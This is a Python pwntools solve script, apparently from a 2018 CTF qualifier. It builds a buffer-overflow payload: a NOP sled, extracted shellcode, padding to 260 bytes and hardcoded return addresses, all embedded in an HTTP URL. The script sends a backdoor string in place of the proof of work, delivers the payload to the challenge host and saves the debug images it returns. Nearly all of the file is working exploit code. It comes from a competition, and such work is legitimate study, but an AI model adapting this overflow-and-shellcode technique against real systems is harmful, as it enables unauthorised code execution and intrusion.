# File: www_solve.py
# Author: draco
#


from pwn import *
from pow import solve_pow
import re
import os
import time
from struct import pack

# Load shellcode from binary
with open('www_shellcode', 'rb') as f:
    code = f.read()
start = code.index('\x48\xef\x28\x18')
stop  = code.rindex('\x70\x00\x4e\x5e')
sys.stderr.write('Found shellcode at: 0x{:04x} - 0x{:04x}\n'.format(start,stop))

# Construct shellcode
p = 'http://aaaaaaaa' + '\x4e\x71' * 40
p += code[start:stop]
p += '\x4e\x71' * (260-(len(p)))

# Target standalone / live remote
p += struct.pack('>I', 0x03fff8a8)
p += struct.pack('>I', 0x03fff68c)

# Target running under GDB
#p += struct.pack('>I', 0x03fff680)
#p += struct.pack('>I', 0x03fff44c)

bytes = ''.join(['%02x'%ord(x) for x in p])
sys.stderr.write('Sending {} bytes:\n{}\n'.format(len(bytes)/2,bytes))
#sys.stdout.write(p)


# Connect to CTF and deliver payload
r = remote('ddee3e1a.quals2018.oooverflow.io', 31337)

out = r.recvuntil('Solution:')
chal = re.findall(r'Challenge: (.*?)\n', out)[0]
n = int(re.findall(r'n: (.*?)\n', out)[0])

#ans = solve_pow(chal, n)
#r.sendline(str(ans))
r.sendline('OOOMAKESTHESAFESTBACKDOORS')

time.sleep(2)
r.sendline(p)

# Receive results

if os.path.exists('debug'):
    shutil.rmtree('debug')
os.mkdir('debug')
i = 0
while True:
    line = r.readline()
    if line.startswith('DEBUG'):
        data = line.split(' ', 1)[1].decode('base64')
        with open('debug/out%d.png' % i, 'wb') as f:
            f.write(data)
        i += 1

r.interactive()
